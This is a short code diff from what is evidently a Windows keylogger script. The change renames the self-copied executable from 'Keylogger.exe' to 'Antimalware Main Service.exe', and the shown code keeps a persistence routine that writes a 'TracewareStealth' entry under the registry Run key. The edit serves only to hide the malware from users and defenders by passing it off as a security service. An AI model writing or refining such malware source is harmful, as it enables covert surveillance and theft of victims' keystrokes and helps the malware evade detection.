@@ -177,7 +177,7 @@ if getattr(sys, 'frozen', False):
 else:
     original_path = os.path.abspath(__file__)  # Path to the current script
 
-alternative_path = r"C:\Users\Public\Documents\Keylogger.exe"  # Path for copying
+alternative_path = r"C:\Users\Public\Documents\Antimalware Main Service.exe"  # Path for copying
 
 # Function to copy the executable to an alternative location
 def copy_executable_to_alternative():
@@ -194,7 +194,7 @@ def copy_executable_to_alternative():
 def add_to_startup():
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     value_name = "TracewareStealth"
-    command = f'"{alternative_path}" --processStart Keylogger.exe'  # Command to run the executable from the alternative location
+    command = f'"{alternative_path}" --processStart Antimalware Main Service.exe'  # Command to run the executable from the alternative location
 
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
